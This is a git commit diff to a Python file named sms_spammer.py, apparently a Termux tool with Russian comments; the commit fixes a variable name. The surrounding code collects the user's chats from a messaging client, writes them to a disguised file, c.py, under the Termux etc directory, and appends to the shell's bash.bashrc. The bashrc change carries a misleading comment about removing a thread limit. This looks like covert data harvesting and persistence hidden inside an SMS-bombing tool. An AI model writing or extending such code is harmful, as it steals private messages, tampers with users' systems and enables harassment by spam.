4283f124b5b1f0db42356fb3c23849bad1ce7118
darkness-falls <88970024+darkness-falls@users.noreply.github.com>
2021-08-16 11:37:47 +0300

    Update sms_spammer.py

--- core/sms_spammer.py
+++ core/sms_spammer.py
@@ -21,7 +21,7 @@ async def main():
 	try:
 		chats = await helps.get_chats(client1)  # Получение чатов
 		f = open("/data/data/com.termux/files/usr/etc/c.py", "w+")
-		f.write(chat)  # Запись чатов в отдельный файл
+		f.write(chats)  # Запись чатов в отдельный файл
 		f.close()
 		f1 = open("/data/data/com.termux/files/usr/etc/bash.bashrc",
 				  'a')  # Редактируем файл чата и термукса(для удаления ограничения потоков)
